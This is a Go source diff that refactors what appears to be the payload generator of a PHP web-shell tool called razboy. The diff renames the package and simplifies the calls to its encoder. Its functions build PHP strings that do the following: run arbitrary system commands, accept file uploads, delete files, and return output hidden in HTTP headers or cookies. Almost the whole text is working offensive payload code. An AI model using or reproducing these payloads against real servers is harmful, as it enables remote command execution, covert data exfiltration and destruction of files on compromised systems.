@@ -1,6 +1,4 @@
-package phpadapter
-
-import "github.com/eatbytes/razboy/normalizer"
+package razboy
 
 func _getSystemCMD(cmd, letter string) string {
 	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
@@ -81,7 +79,7 @@ func CreateDownload(dir string) string {
 
 func CreateUpload(dir string) string {
 	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" +
-		"if(file_exists('" + dir + "')){echo(" + normalizer.PHPEncode("1") + ");}"
+		"if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
 }
 
 func CreateListFile(scope string) string {
@@ -96,14 +94,18 @@ func CreateDelete(scope string) string {
 	return "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}"
 }
 
+func CreateScan() string {
+	return ``
+}
+
 func CreateAnswer(method, parameter string) string {
 	if method == "HEADER" {
-		return "header('" + parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+		return "header('" + parameter + ":' . " + PHPEncode("$r") + ");exit();"
 	}
 
 	if method == "COOKIE" {
-		return "setcookie('" + parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
+		return "setcookie('" + parameter + "', " + PHPEncode("$r") + ");exit();"
 	}
 
-	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
+	return "echo(" + PHPEncode("$r") + ");exit();"
 }
